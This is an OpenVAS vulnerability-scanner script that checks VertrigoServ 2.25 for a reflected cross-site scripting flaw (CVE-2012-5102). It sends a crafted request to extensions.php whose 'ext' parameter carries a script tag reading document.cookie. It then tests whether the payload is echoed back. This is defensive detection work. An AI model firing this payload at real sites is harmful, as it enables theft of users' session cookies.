###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vertrigo_serv_ext_param_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# VertrigoServ 'ext' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site.
  Impact Level: Application";
tag_affected = "VertrigoServ version 2.25";
tag_insight = "The flaw is caused by an input validation error in the 'ext' parameter in
  'extensions.php' when processing user-supplied data.";
tag_solution = "No solution or patch is available as of 09th January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://vertrigo.sourceforge.net/index.php";
tag_summary = "This host is running VertrigoServ and is prone to cross-site scripting
  vulnerability.";

if(description)
{
  script_id(802556);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5102");
  script_bugtraq_id(51293);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-09 12:11:55 +0530 (Mon, 09 Jan 2012)");
  script_name("VertrigoServ 'ext' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47469/");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Jan/33");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521125");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108391/INFOSERVE-ADV2011-11.txt");

  script_description(desc);
  script_summary("Check if VertrigoServ is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Confirm the application
sndReq = http_get(item: "/index.php", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if(">Welcome to VertrigoServ<" >< rcvRes)
{
  ## Construct the Attack Request
  url = '/inc/extensions.php?mode=extensions&ext=<script>alert' +
        '(document.cookie)</script>';

  ## Try attack and check the response to confirm vulnerability.
  if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document." +
                               "cookie\)</script>")){
    security_warning(port);
  }
}
